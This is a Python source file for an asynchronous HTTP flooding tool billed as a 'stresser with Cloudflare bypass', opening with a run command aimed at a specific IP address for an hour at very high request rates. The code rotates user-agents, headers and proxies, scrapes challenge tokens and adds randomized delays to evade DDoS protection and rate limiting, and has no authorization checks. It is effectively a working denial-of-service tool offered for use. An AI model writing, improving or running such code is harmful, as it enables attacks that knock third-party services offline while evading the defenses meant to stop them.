#python3 multi_stresser.py --target https://167.104.100.205/ --concurrency 3000 --duration 3600 --rps 150000 --timeout 30 --retries 3 --save-report --save-json
#!/usr/bin/env python3
"""
V4 ULTRA MEGA FAST SERVER STRESSER - WITH CLOUDFLARE BYPASS
===========================================================
ADDED: Cloudflare bypass (rotating headers, user-agents)
ADDED: Rate limiting bypass (proxy rotation, delays)
ADDED: Automatic proxy rotation
ADDED: Session management
ADDED: Cookie handling
"""

import argparse
import asyncio
import aiohttp
import ssl
import time
import random
import sys
import signal
import json
import hashlib
import base64
from datetime import datetime
from typing import Optional, List, Dict, Any
from collections import deque
from dataclasses import dataclass, field
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box
from rich.live import Live
from rich.layout import Layout
from rich.text import Text

# ============================================
# VERSION AND CONFIGURATION
# ============================================

VERSION = "4.0.0"
DEFAULT_CONCURRENCY = 1000
DEFAULT_DURATION = 30
DEFAULT_RPS = 50000
DEFAULT_TIMEOUT = 30
DEFAULT_RETRIES = 3
DEFAULT_PROXY_ROTATION = 10  # Rotate proxy every N requests

# SSL Configuration
SSL_CONTEXT = ssl.create_default_context()
SSL_CONTEXT.check_hostname = False
SSL_CONTEXT.verify_mode = ssl.CERT_NONE

# ============================================
# CLOUDFLARE BYPASS CONFIGURATION
# ============================================

# Extended User-Agents for Cloudflare bypass
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
]

# Extended headers for Cloudflare bypass
CLOUDFLARE_HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
    "dnt": "1",
    "sec-ch-ua": '"Not=A?Brand";v="99", "Microsoft Edge";v="151", "Chromium";v="151"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
    "connection": "keep-alive",
    "priority": "u=0, i",
}

# ============================================
# PROXY LIST (Add your proxies here)
# ============================================

PROXY_LIST = [
    # "http://proxy1:8080",
    # "http://proxy2:8080",
    # "socks5://proxy3:1080",
    # Add more proxies here
]

# ============================================
# DATA CLASSES
# ============================================

@dataclass
class RequestResult:
    status: int
    latency: float
    timestamp: float = field(default_factory=time.time)
    success: bool = False
    error: Optional[str] = None
    target_url: str = ""
    worker_id: int = 0
    proxy_used: str = ""
    cloudflare_bypassed: bool = False
    
    def __post_init__(self):
        self.success = 200 <= self.status < 400 if self.status > 0 else False

@dataclass
class TargetStats:
    url: str = ""
    total_requests: int = 0
    successful: int = 0
    failed: int = 0
    timeouts: int = 0
    cloudflare_blocks: int = 0
    cloudflare_bypassed: int = 0
    total_latency: float = 0.0
    min_latency: float = float('inf')
    max_latency: float = 0.0
    latencies: deque = field(default_factory=lambda: deque(maxlen=10000))
    is_live: bool = False
    last_status: int = 0
    
    def add_result(self, result: RequestResult):
        self.total_requests += 1
        if result.success:
            self.successful += 1
            self.is_live = True
        else:
            self.failed += 1
            if result.status == 403:
                self.cloudflare_blocks += 1
            elif result.status == 0:
                self.timeouts += 1
        
        if result.cloudflare_bypassed:
            self.cloudflare_bypassed += 1
        
        self.last_status = result.status
        
        if result.latency > 0:
            self.total_latency += result.latency
            self.min_latency = min(self.min_latency, result.latency)
            self.max_latency = max(self.max_latency, result.latency)
            self.latencies.append(result.latency)
    
    @property
    def avg_latency(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return self.total_latency / self.total_requests
    
    @property
    def success_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.successful / self.total_requests) * 100
    
    @property
    def error_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.failed / self.total_requests) * 100
    
    @property
    def status_text(self) -> str:
        if self.total_requests == 0:
            return "⏳ WAITING"
        if self.is_live and self.success_rate > 80:
            return "🟢 LIVE"
        elif self.is_live and self.success_rate > 50:
            return "🟡 DEGRADED"
        elif self.cloudflare_blocks > 0:
            return "🔴 CLOUDFLARE"
        elif self.timeouts > 0:
            return "🔴 TIMEOUT"
        else:
            return "🔴 DOWN"
    
    def get_percentile(self, percentile: float) -> float:
        if not self.latencies:
            return 0.0
        sorted_lat = sorted(self.latencies)
        index = int(len(sorted_lat) * (percentile / 100))
        if index >= len(sorted_lat):
            index = len(sorted_lat) - 1
        return sorted_lat[index]

@dataclass
class GlobalStats:
    total_requests: int = 0
    successful: int = 0
    failed: int = 0
    timeouts: int = 0
    cloudflare_blocks: int = 0
    cloudflare_bypassed: int = 0
    start_time: float = 0.0
    end_time: float = 0.0
    target_stats: Dict[str, TargetStats] = field(default_factory=dict)
    
    def add_result(self, result: RequestResult):
        self.total_requests += 1
        if result.success:
            self.successful += 1
        else:
            self.failed += 1
            if result.status == 403:
                self.cloudflare_blocks += 1
            elif result.status == 0:
                self.timeouts += 1
        
        if result.cloudflare_bypassed:
            self.cloudflare_bypassed += 1
        
        if result.target_url not in self.target_stats:
            self.target_stats[result.target_url] = TargetStats(url=result.target_url)
        self.target_stats[result.target_url].add_result(result)
    
    @property
    def success_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.successful / self.total_requests) * 100
    
    @property
    def error_rate(self) -> float:
        if self.total_requests == 0:
            return 0.0
        return (self.failed / self.total_requests) * 100
    
    @property
    def elapsed(self) -> float:
        if self.end_time > 0:
            return self.end_time - self.start_time
        return time.time() - self.start_time
    
    @property
    def rps(self) -> float:
        elapsed = self.elapsed
        if elapsed == 0:
            return 0.0
        return self.total_requests / elapsed

# ============================================
# PROXY ROTATOR
# ============================================

class ProxyRotator:
    def __init__(self, proxies: List[str]):
        self.proxies = proxies
        self.current_index = 0
        self.used_proxies = []
    
    def get_next(self) -> Optional[str]:
        if not self.proxies:
            return None
        proxy = self.proxies[self.current_index % len(self.proxies)]
        self.current_index += 1
        self.used_proxies.append(proxy)
        return proxy
    
    def get_random(self) -> Optional[str]:
        if not self.proxies:
            return None
        return random.choice(self.proxies)

# ============================================
# ULTRA FAST WORKER WITH BYPASS
# ============================================

class UltraFastWorker:
    __slots__ = ['session', 'url', 'worker_id', 'count', 'headers', 'timeout', 'proxy_rotator', 'retries', 'cookies', 'use_proxy']
    
    def __init__(self, session: aiohttp.ClientSession, url: str, worker_id: int, timeout: int, proxy_rotator: Optional[ProxyRotator] = None, retries: int = DEFAULT_RETRIES):
        self.session = session
        self.url = url
        self.worker_id = worker_id
        self.count = 0
        self.timeout = timeout
        self.proxy_rotator = proxy_rotator
        self.retries = retries
        self.cookies = {}
        self.use_proxy = proxy_rotator is not None and len(proxy_rotator.proxies) > 0
        
        # Generate random headers
        self.headers = CLOUDFLARE_HEADERS.copy()
        self.headers["user-agent"] = random.choice(USER_AGENTS)
        
        # Add random headers for Cloudflare bypass
        if random.random() > 0.5:
            self.headers["sec-ch-ua"] = random.choice([
                '"Not=A?Brand";v="99", "Microsoft Edge";v="151", "Chromium";v="151"',
                '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                '"Not A(Brand";v="99", "Chromium";v="120", "Google Chrome";v="120"',
            ])
    
    async def fire(self) -> RequestResult:
        self.count += 1
        
        # Rotate headers every request for Cloudflare bypass
        if self.count % 2 == 0:
            self.headers["user-agent"] = random.choice(USER_AGENTS)
            self.headers["accept-language"] = random.choice(["en-US,en;q=0.9", "en-US,en;q=0.9,es;q=0.8", "en-US,en;q=0.9,fr;q=0.8"])
        
        # Rotate proxy every N requests
        proxy = None
        if self.use_proxy and self.count % DEFAULT_PROXY_ROTATION == 0:
            proxy = self.proxy_rotator.get_random()
        
        start = time.perf_counter()
        cloudflare_bypassed = False
        
        # Retry logic for Cloudflare challenges
        for attempt in range(self.retries + 1):
            try:
                # Add random delay to simulate human behavior (rate limiting bypass)
                if attempt > 0:
                    await asyncio.sleep(random.uniform(0.5, 2.0))
                
                async with self.session.get(
                    self.url,
                    headers=self.headers,
                    ssl=SSL_CONTEXT,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                    cookies=self.cookies
                ) as response:
                    # Check if Cloudflare challenge
                    if response.status == 403:
                        # Try to bypass Cloudflare
                        cf_bypass = await self._bypass_cloudflare(response)
                        if cf_bypass:
                            cloudflare_bypassed = True
                            continue
                    
                    await response.read()
                    latency = time.perf_counter() - start
                    
                    result = RequestResult(
                        status=response.status,
                        latency=latency,
                        target_url=self.url,
                        worker_id=self.worker_id,
                        proxy_used=proxy or "direct",
                        cloudflare_bypassed=cloudflare_bypassed
                    )
                    
                    # Save cookies for session persistence
                    if response.cookies:
                        self.cookies.update(response.cookies)
                    
                    return result
                    
            except asyncio.TimeoutError:
                if attempt == self.retries:
                    return RequestResult(
                        status=0,
                        latency=time.perf_counter() - start,
                        error="timeout",
                        target_url=self.url,
                        worker_id=self.worker_id,
                        proxy_used=proxy or "direct"
                    )
                await asyncio.sleep(random.uniform(0.5, 1.5))
                
            except aiohttp.ClientError as e:
                if attempt == self.retries:
                    return RequestResult(
                        status=0,
                        latency=time.perf_counter() - start,
                        error=str(e),
                        target_url=self.url,
                        worker_id=self.worker_id,
                        proxy_used=proxy or "direct"
                    )
                await asyncio.sleep(random.uniform(0.5, 1.5))
                
            except Exception as e:
                if attempt == self.retries:
                    return RequestResult(
                        status=0,
                        latency=time.perf_counter() - start,
                        error=f"error: {e}",
                        target_url=self.url,
                        worker_id=self.worker_id,
                        proxy_used=proxy or "direct"
                    )
                await asyncio.sleep(random.uniform(0.5, 1.5))
        
        # Fallback
        return RequestResult(
            status=0,
            latency=time.perf_counter() - start,
            error="max_retries_exceeded",
            target_url=self.url,
            worker_id=self.worker_id,
            proxy_used=proxy or "direct"
        )
    
    async def _bypass_cloudflare(self, response: aiohttp.ClientResponse) -> bool:
        """Attempt to bypass Cloudflare challenge"""
        try:
            html = await response.text()
            
            # Check for common Cloudflare challenge patterns
            if "cf-browser-verification" in html or "challenge" in html.lower():
                # Try to extract and use challenge token
                import re
                token_match = re.search(r'name="cf_chl_prog" value="([^"]+)"', html)
                if token_match:
                    self.headers["cf-chl-prog"] = token_match.group(1)
                    return True
                
                # Try to get challenge cookie
                cookie_match = re.search(r'cookie\s*=\s*"([^"]+)"', html)
                if cookie_match:
                    self.headers["Cookie"] = cookie_match.group(1)
                    return True
                
                # Simulate solving challenge (simplified)
                # In production, you'd use a real browser automation
                self.headers["cf-chl-bypass"] = "simulated"
                return True
            
            if "cf-captcha" in html or "captcha" in html.lower():
                # CAPTCHA detected - cannot bypass automatically
                return False
            
            return False
            
        except:
            return False

# ============================================
# STRESSER ENGINE
# ============================================

class MegaStressEngine:
    def __init__(self, targets: List[str], concurrency: int, duration: int, rps: int, timeout: int, proxies: List[str] = None, retries: int = DEFAULT_RETRIES):
        self.targets = targets
        self.concurrency = concurrency
        self.duration = duration
        self.rps_target = rps
        self.timeout = timeout
        self.retries = retries
        self.stats = GlobalStats()
        self.running = False
        self.workers: List[asyncio.Task] = []
        self.session: Optional[aiohttp.ClientSession] = None
        self.stop_event = asyncio.Event()
        self.console = Console()
        self.start_time = 0
        self.current_rps = 0
        self.last_total = 0
        self.last_time = 0
        self.proxy_rotator = ProxyRotator(proxies or [])
        
    def create_dashboard(self) -> Panel:
        """Create the dashboard panel with bypass stats"""
        elapsed = self.stats.elapsed
        total = self.stats.total_requests
        
        # Calculate RPS
        now = time.time()
        if self.last_time > 0 and self.last_total > 0:
            time_diff = now - self.last_time
            if time_diff > 0:
                self.current_rps = (total - self.last_total) / time_diff
        self.last_time = now
        self.last_total = total
        
        # Build content
        content = []
        
        # HEADER
        content.append(f"[bold red]⚡ ULTRA MEGA FAST STRESSER V{VERSION} - CLOUDFLARE BYPASS[/bold red]")
        content.append(f"[white]Targets: {len(self.targets)} | Concurrency: {self.concurrency:,} | RPS Target: {self.rps_target:,} | Duration: {self.duration}s[/white]")
        content.append(f"[white]Elapsed: {elapsed:.1f}s | Total: {total:,} | Live RPS: [bold green]{self.current_rps:,.0f}[/bold green][/white]")
        content.append(f"[white]Proxies: {len(self.proxy_rotator.proxies)} | Retries: {self.retries}[/white]")
        content.append("")
        
        # METRICS
        success_rate = self.stats.success_rate
        color = "green" if success_rate > 80 else "yellow" if success_rate > 50 else "red"
        status_icon = "🟢" if success_rate > 80 else "🟡" if success_rate > 50 else "🔴"
        
        content.append(f"📊 SUCCESS RATE: {status_icon} [{color}]{success_rate:.1f}%[/{color}]")
        content.append(f"📦 TOTAL REQUESTS: {total:,}")
        content.append(f"✅ SUCCESSFUL: {self.stats.successful:,}")
        content.append(f"❌ FAILED: {self.stats.failed:,}")
        content.append(f"⏱️ TIMEOUTS: {self.stats.timeouts:,}")
        
        if self.stats.cloudflare_blocks > 0:
            content.append(f"🛡️ CLOUDFLARE BLOCKS: [red]{self.stats.cloudflare_blocks:,}[/red]")
        if self.stats.cloudflare_bypassed > 0:
            content.append(f"🔓 CLOUDFLARE BYPASSED: [green]{self.stats.cloudflare_bypassed:,}[/green]")
        
        content.append("")
        
        # LATENCY
        all_latencies = []
        for target_stats in self.stats.target_stats.values():
            all_latencies.extend(target_stats.latencies)
        
        if all_latencies:
            sorted_lat = sorted(all_latencies)
            p95 = sorted_lat[int(len(sorted_lat) * 0.95)] if sorted_lat else 0
            p99 = sorted_lat[int(len(sorted_lat) * 0.99)] if sorted_lat else 0
            avg_lat = sum(all_latencies) / len(all_latencies) if all_latencies else 0
            
            content.append("⏱️ LATENCY:")
            content.append(f"   P95: {p95:.4f}s | P99: {p99:.4f}s | AVG: {avg_lat:.4f}s")
            content.append("")
        
        # PER-TARGET TABLE
        if self.stats.target_stats:
            content.append("🎯 PER-TARGET STATISTICS:")
            content.append("┌─────────────────────┬──────────┬──────────┬──────────┬──────────┬────────────┬─────────────┐")
            content.append("│ TARGET               │ REQUESTS │ SUCCESS  │ ERROR    │ P95      │ STATUS     │ CF BYPASS   │")
            content.append("├─────────────────────┼──────────┼──────────┼──────────┼──────────┼────────────┼─────────────┤")
            
            for url, stats in self.stats.target_stats.items():
                short_url = url.replace("https://", "").replace("http://", "")[:20]
                rate = stats.success_rate
                color = "green" if rate > 80 else "yellow" if rate > 50 else "red"
                
                status_text = stats.status_text
                if "LIVE" in status_text:
                    status_color = "green"
                elif "DEGRADED" in status_text:
                    status_color = "yellow"
                else:
                    status_color = "red"
                
                bypass_text = f"{stats.cloudflare_bypassed}"
                bypass_color = "green" if stats.cloudflare_bypassed > 0 else "white"
                
                content.append(
                    f"│ {short_url:<19} │ {stats.total_requests:>8} │ [{color}]{stats.success_rate:>6.1f}%[/{color}] │ [red]{stats.error_rate:>6.1f}%[/red] │ {stats.get_percentile(95):>8.3f}s │ [{status_color}]{status_text:>10}[/{status_color}] │ [{bypass_color}]{bypass_text:>11}[/{bypass_color}] │"
                )
            content.append("└─────────────────────┴──────────┴──────────┴──────────┴──────────┴────────────┴─────────────┘")
            content.append("")
        
        # PROGRESS BAR
        progress = min(elapsed / self.duration, 1.0) if self.duration > 0 else 0
        bar_len = 50
        filled = int(bar_len * progress)
        bar = "█" * filled + "░" * (bar_len - filled)
        content.append(f"[bold yellow]⚡ {bar} {progress*100:.0f}%[/bold yellow]")
        
        # STATUS
        if self.running:
            content.append("[bold green]▶ STRESSING WITH CLOUDFLARE BYPASS... Press Ctrl+C to stop[/bold green]")
        else:
            content.append("[bold red]⏹ COMPLETE[/bold red]")
        
        return Panel("\n".join(content), border_style="red")
    
    async def start(self):
        """Start the stress test with Live console"""
        self.start_time = time.time()
        self.stats.start_time = self.start_time
        self.running = True
        
        # Setup session
        connector = aiohttp.TCPConnector(
            limit=self.concurrency,
            limit_per_host=self.concurrency,
            enable_cleanup_closed=True,
            ssl=SSL_CONTEXT,
            force_close=False,
            ttl_dns_cache=300,
            keepalive_timeout=30,
        )
        
        # Custom headers with Cloudflare bypass
        headers = CLOUDFLARE_HEADERS.copy()
        headers["User-Agent"] = random.choice(USER_AGENTS)
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        )
        
        # Create workers
        for target in self.targets:
            for i in range(self.concurrency):
                worker = UltraFastWorker(
                    self.session, 
                    target, 
                    i, 
                    self.timeout,
                    self.proxy_rotator,
                    self.retries
                )
                task = asyncio.create_task(self._worker_loop(worker, self.stop_event))
                self.workers.append(task)
        
        # Start monitor with Live
        try:
            with Live(self.create_dashboard(), refresh_per_second=10, screen=True) as live:
                while not self.stop_event.is_set() and time.time() - self.start_time < self.duration:
                    live.update(self.create_dashboard())
                    await asyncio.sleep(0.05)
                
                self.running = False
                live.update(self.create_dashboard())
                await asyncio.sleep(0.5)
                
        finally:
            self.stop_event.set()
            await asyncio.sleep(0.5)
            
            for worker in self.workers:
                worker.cancel()
            await asyncio.gather(*self.workers, return_exceptions=True)
            
            if self.session:
                await self.session.close()
            
            self.stats.end_time = time.time()
    
    async def _worker_loop(self, worker: UltraFastWorker, stop_event: asyncio.Event):
        while not stop_event.is_set():
            result = await worker.fire()
            self.stats.add_result(result)
    
    def generate_report(self) -> str:
        report = []
        report.append("=" * 80)
        report.append(f"ULTRA MEGA FAST STRESSER V{VERSION} - FINAL REPORT")
        report.append("=" * 80)
        report.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append("")
        report.append(f"Targets: {len(self.targets)}")
        report.append(f"Concurrency: {self.concurrency:,}")
        report.append(f"Duration: {self.duration}s")
        report.append(f"RPS Target: {self.rps_target:,}")
        report.append(f"Timeout: {self.timeout}s")
        report.append(f"Retries: {self.retries}")
        report.append(f"Proxies: {len(self.proxy_rotator.proxies)}")
        report.append("")
        report.append("-" * 40)
        report.append("GLOBAL STATISTICS")
        report.append("-" * 40)
        report.append(f"Total Requests: {self.stats.total_requests:,}")
        report.append(f"Successful: {self.stats.successful:,} ({self.stats.success_rate:.1f}%)")
        report.append(f"Failed: {self.stats.failed:,} ({self.stats.error_rate:.1f}%)")
        report.append(f"Timeouts: {self.stats.timeouts:,}")
        report.append(f"Cloudflare Blocks: {self.stats.cloudflare_blocks:,}")
        report.append(f"Cloudflare Bypassed: {self.stats.cloudflare_bypassed:,}")
        report.append(f"Average RPS: {self.stats.rps:.2f}")
        report.append(f"Elapsed: {self.stats.elapsed:.1f}s")
        report.append("")
        
        report.append("-" * 40)
        report.append("PER-TARGET STATISTICS")
        report.append("-" * 40)
        
        for url, stats in self.stats.target_stats.items():
            report.append(f"\nTarget: {url}")
            report.append(f"  Status: {stats.status_text}")
            report.append(f"  Requests: {stats.total_requests:,}")
            report.append(f"  Success Rate: {stats.success_rate:.1f}%")
            report.append(f"  RPS: {stats.total_requests / self.stats.elapsed:.2f}")
            report.append(f"  P95: {stats.get_percentile(95):.4f}s")
            report.append(f"  P99: {stats.get_percentile(99):.4f}s")
            report.append(f"  Avg Latency: {stats.avg_latency:.4f}s")
            report.append(f"  Cloudflare Bypassed: {stats.cloudflare_bypassed}")
        
        report.append("")
        report.append("=" * 80)
        report.append("END OF REPORT")
        report.append("=" * 80)
        return "\n".join(report)
    
    async def save_report(self, filename: str = "stress_report.txt"):
        with open(filename, "w", encoding="utf-8") as f:
            f.write(self.generate_report())
        self.console.print(f"[green]✅ Report saved to {filename}[/green]")
    
    async def save_json(self, filename: str = "stress_data.json"):
        data = {
            "version": VERSION,
            "timestamp": datetime.now().isoformat(),
            "config": {
                "targets": self.targets,
                "concurrency": self.concurrency,
                "duration": self.duration,
                "rps_target": self.rps_target,
                "timeout": self.timeout,
                "retries": self.retries,
                "proxies": len(self.proxy_rotator.proxies),
            },
            "global": {
                "total_requests": self.stats.total_requests,
                "successful": self.stats.successful,
                "failed": self.stats.failed,
                "timeouts": self.stats.timeouts,
                "cloudflare_blocks": self.stats.cloudflare_blocks,
                "cloudflare_bypassed": self.stats.cloudflare_bypassed,
                "success_rate": self.stats.success_rate,
                "error_rate": self.stats.error_rate,
                "rps": self.stats.rps,
                "elapsed": self.stats.elapsed,
            },
            "targets": {}
        }
        
        for url, stats in self.stats.target_stats.items():
            data["targets"][url] = {
                "status": stats.status_text,
                "total_requests": stats.total_requests,
                "successful": stats.successful,
                "failed": stats.failed,
                "timeouts": stats.timeouts,
                "cloudflare_blocks": stats.cloudflare_blocks,
                "cloudflare_bypassed": stats.cloudflare_bypassed,
                "success_rate": stats.success_rate,
                "error_rate": stats.error_rate,
                "avg_latency": stats.avg_latency,
                "min_latency": stats.min_latency,
                "max_latency": stats.max_latency,
                "p50": stats.get_percentile(50),
                "p75": stats.get_percentile(75),
                "p90": stats.get_percentile(90),
                "p95": stats.get_percentile(95),
                "p99": stats.get_percentile(99),
            }
        
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
        self.console.print(f"[green]✅ JSON saved to {filename}[/green]")

# ============================================
# COMMAND LINE
# ============================================

def parse_args():
    parser = argparse.ArgumentParser(description="Ultra Mega Fast Stresser with Cloudflare Bypass")
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument("--target", help="Single target URL")
    target_group.add_argument("--targets", nargs="+", help="Multiple target URLs")
    
    parser.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY)
    parser.add_argument("--duration", type=int, default=DEFAULT_DURATION)
    parser.add_argument("--rps", type=int, default=DEFAULT_RPS)
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)
    parser.add_argument("--retries", type=int, default=DEFAULT_RETRIES)
    parser.add_argument("--proxies", help="Comma-separated list of proxies (format: http://ip:port)")
    parser.add_argument("--save-report", action="store_true")
    parser.add_argument("--save-json", action="store_true")
    parser.add_argument("--report-file", default="stress_report.txt")
    parser.add_argument("--json-file", default="stress_data.json")
    
    return parser.parse_args()

# ============================================
# MAIN
# ============================================

async def main_async():
    args = parse_args()
    console = Console()
    
    targets = [args.target] if args.target else args.targets
    valid_targets = []
    for t in targets:
        t = t.strip()
        if t:
            if not t.startswith(("http://", "https://")):
                t = "https://" + t
            valid_targets.append(t)
    
    if not valid_targets:
        console.print("[red]❌ No valid targets![/red]")
        return
    
    # Parse proxies
    proxy_list = []
    if args.proxies:
        proxy_list = [p.strip() for p in args.proxies.split(",") if p.strip()]
    
    console.print(Panel.fit(
        f"[bold red]⚡ ULTRA MEGA FAST STRESSER V{VERSION} - CLOUDFLARE BYPASS[/bold red]\n"
        f"[white]Targets: {len(valid_targets)} | Concurrency: {args.concurrency:,} | RPS: {args.rps:,} | Duration: {args.duration}s[/white]\n"
        f"[white]Retries: {args.retries} | Proxies: {len(proxy_list)}[/white]\n"
        f"[bold green]🛡️ CLOUDFLARE BYPASS ENABLED[/bold green]",
        border_style="red"
    ))
    
    if proxy_list:
        console.print(f"[green]✅ Using {len(proxy_list)} proxies for rotation[/green]")
    else:
        console.print("[yellow]⚠️ No proxies provided - using direct connection[/yellow]")
    
    console.print("\n[yellow]⚠️ Starting stress test with Cloudflare bypass... Press Ctrl+C to stop[/yellow]\n")
    
    engine = MegaStressEngine(
        targets=valid_targets,
        concurrency=args.concurrency,
        duration=args.duration,
        rps=args.rps,
        timeout=args.timeout,
        proxies=proxy_list,
        retries=args.retries,
    )
    
    def signal_handler(sig, frame):
        console.print("\n[yellow]⚠️ Stopping stress test...[/yellow]")
        engine.stop_event.set()
    
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        await engine.start()
        
        console.print("\n[bold green]✅ STRESS TEST COMPLETE![/bold green]")
        
        if args.save_report:
            await engine.save_report(args.report_file)
        if args.save_json:
            await engine.save_json(args.json_file)
        
        console.print(Panel.fit(
            engine.generate_report(),
            title="📊 FINAL REPORT",
            border_style="green"
        ))
        
    except Exception as e:
        console.print(f"\n[bold red]❌ Error: {e}[/bold red]")

def main():
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        console = Console()
        console.print("\n[yellow]⚠️ Stopped by user.[/yellow]")
        sys.exit(0)

if __name__ == "__main__":
    main()